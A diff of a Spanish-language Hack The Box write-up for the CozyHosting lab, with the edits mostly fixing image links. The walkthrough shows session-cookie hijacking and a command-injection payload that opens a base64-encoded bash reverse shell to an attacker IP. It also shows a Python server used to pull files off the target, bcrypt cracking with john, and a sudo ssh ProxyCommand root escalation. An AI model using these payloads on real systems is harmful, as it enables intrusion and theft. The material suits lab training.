@@ -1,11 +1,11 @@
 ---
 layout: single
-title: CozzyHosting
-excerpt: CozzyHosting machine
+title: CozyHosting - Hack The Box
+excerpt: CozyHosting is an easy-difficulty Linux machine that features a `Spring Boot` application. The application has the `Actuator` endpoint enabled. Enumerating the endpoint leads to the discovery of a user&amp;#039;s session cookie, leading to authenticated access to the main dashboard. The application is vulnerable to command injection, which is leveraged to gain a reverse shell on the remote machine. Enumerating the application&amp;#039;s `JAR` file, hardcoded credentials are discovered and used to log into the local database. The database contains a hashed password, which once cracked is used to log into the machine as the user `josh`. The user is allowed to run `ssh` as `root`, which is leveraged to fully escalate privileges.
 date: 2024-06-28
 classes: wide
 header:
-  teaser: /assets/images/CozzyHosting.png
+  teaser: /assets/images/CozyHosting.png
   teaser_home_page: true
   icon: /assets/images/hackthebox.webp
 categories:
@@ -16,9 +16,7 @@ tags:
   - sqli
   - hash
 ---
-![[CozyHosting.png]]
-![](CozyHosting.png)
-![](/assets/images/CozyHosting.png)
+![|500](/assets/images/CozyHosting.png)
 ## Puertos
 Se realiza un escaneo de puertos y servicios a la IP de la máquina usando nmap con el comando:
 ```sh
@@ -30,6 +28,7 @@ Se realiza un escaneo enfocado a estos puertos de nuevo con nmap:
 sudo nmap -sCV -A -p22,80 10.10.11.230
 ```
 
+```
 **22/tcp open  ssh**     syn-ack ttl 63 **OpenSSH 8.9p1 Ubuntu 3ubuntu0.3** (Ubuntu Linux; protocol 2.0)
 	| ssh-hostkey:
 	|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
@@ -42,6 +41,7 @@ sudo nmap -sCV -A -p22,80 10.10.11.230
 	|http-favicon: Unknown favicon MD5: 72A61F8058A9468D57C3017158769B1F
 	|http-methods:
 	|**Supported Methods: GET HEAD OPTIONS**
+```
 
 Encontramos información como la versión del ssh, el puerto 80 usa nginx
 
@@ -60,7 +60,9 @@ sudo echo "10.10.11.230 cozyhosting.htb" | sudo tee -a /etc/hosts
 Al realizar fuzzing no se encontró información relevante.
 
 Al visualizar el error 404 en una página errónea, la página muestra información útil.
-![[Pasted image 20240628225207.png]]*This application has no explicit mapping for /error, so you are seeing this as a fallback.*
+![](/assets/images/Pasted_image_20240628225207.png)
+
+*This application has no explicit mapping for /error, so you are seeing this as a fallback.*
 El texto de error, sirve para buscar información acerca del mismo en la web.
 
 Se encuentra que el error está asociado a una tecnología llamada **spring boot**.
@@ -75,22 +77,20 @@ Se encuentran varios subdirectorios:
 # Ganando acceso
 ## Reemplazo de cookie
 Se accede a "actuator/sessions", en el que se encuentra información relevante de un usuario y su cookie de sessión:
-![[Pasted image 20240628225239.png]]
+![](/assets/images/Pasted_image_20240628225239.png)
 
 Al entrar a la página cozyhosting.htb/login
 Se presenta una página de inicio de sesión, al rellenar los campos de uduario y contraseña con cualquier texto y reemplazar la cookie de la página por la encontrada anteriormente de "kanderson", se recarga la página.
-![[Pasted image 20240628225302.png]]
+![](/assets/images/Pasted_image_20240628225302.png)
 
 Esto permite el acceso a la página de administrador: cozihosting.htb/admin
 En la cual, se encuentran dos campos, "Hostname" y "Username"
-![[Pasted image 20240628225329.png]]
-
+![](/assets/images/Pasted_image_20240628225329.png)
 ## Capturando la solicitud
 Al rellenar la información con cualquier texto (partyhack en este caso), se procede a capturar el la request con burpsuite y posteriormente enviarla al repeater.
 Luego de enviar la solicitud analizamos la respuesta del servidor y al parecer está ejecutando algo relacionado con ssh.
-![[Pasted image 20240628225347.png]]
+![](/assets/images/Pasted_image_20240628225347.png)
 Intenta ejecutar el comando "ssh" usando como los datos proporcionados: partyhack en ambos casos.
-
 ## Probando PING
 Teniendo esa información podemos intentar ejecutar comandos en el sistema, usando, en este caso un "ping" a nuestra máquina con reemplazando la línea 15 de la solicitud:
 ```sh
@@ -102,7 +102,7 @@ No sin antes haber ejejctado "tcpdump" para poner en escucha con el protocolo IC
 sudo tcpdump ip proto \\icmp -i tun0
 ```
 Ya en escucha, a ejecutar el ping se debería recibirlo como a continuación:
-![[Pasted image 20240628225405.png]]
+![](/assets/images/Pasted_image_20240628225405.png)
 ## Ejecutando la reverse shell
 Se pone en escucha a la máquina local usando netcat en el puerrto 4747 con lo siguiente:
 ```sh
@@ -116,10 +116,10 @@ host=10.10.14.13&username=;echo${IFS%??}"YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjE
 Y se envía la solicitud, no sin antes aplicar un url-encode para asegurarse que no haya problemas al anviar los datos.
 
 Si todo se realizó correctamente obtendremos la revershell como el usuario "app"
-![[Pasted image 20240628225430.png]]
+![](/assets/images/Pasted_image_20240628225430.png)
 
 Los usuarios que son de interés son `josh` y `root`, por lo que lo tendremos en cuenta para después.
-![[Pasted image 20240628225442.png]]
+![](/assets/images/Pasted_image_20240628225442.png)
 l listar los documentos podemos ver un archivo "cloudhosting-0.0.1.jar.jar" que podría contener información relevante.
 Para traer ese archivo a nuestra máquina local. Desde la máquina en la que acabamos de ganar acceso montamos un servidor http con python:
 ```python
@@ -151,17 +151,17 @@ psql -h 127.0.0.1 -U postgres -d cozyhosting
 ```
 
 Listamos las tablas
-![[Pasted image 20240628225507.png]]
+![](/assets/images/Pasted_image_20240628225507.png)
 
 Mostramos el contenido de las columnas de la tabla `user`
-![[Pasted image 20240628225522.png]]
+![](/assets/images/Pasted_image_20240628225522.png)
 
 Teniendo los hashes de las contraseñas, podemos usar fuerza bruta para descifrar el de el usuario `admin` que nos interesa más. Para esto se puede usar `johntheripper`
 ```sh
 john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 El tipo de hash es bcrypt.
-![[Pasted image 20240628225543.png]]
+![](/assets/images/Pasted_image_20240628225543.png)
 
 ngresamos mediante `ssh` usando la contraseña y el usuario `josh`
 ```sh
@@ -169,7 +169,7 @@ ssh josh@10.10.11.230 -p22
 ```
 
 Y obtenemos la flag de user:
-![[Pasted image 20240628225553.png]]
+![](/assets/images/Pasted_image_20240628225553.png)
 # Escalada de privilegios
 Probamos si ejecutar algún comando como root:
 ```sh
@@ -181,4 +181,4 @@ Por lo tanto escalamos privilegios usando ssh de la siguiente manera:
 ```sh
 sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
 ```
-![[Pasted image 20240628225608.png]]
+![](/assets/images/Pasted_image_20240628225608.png)
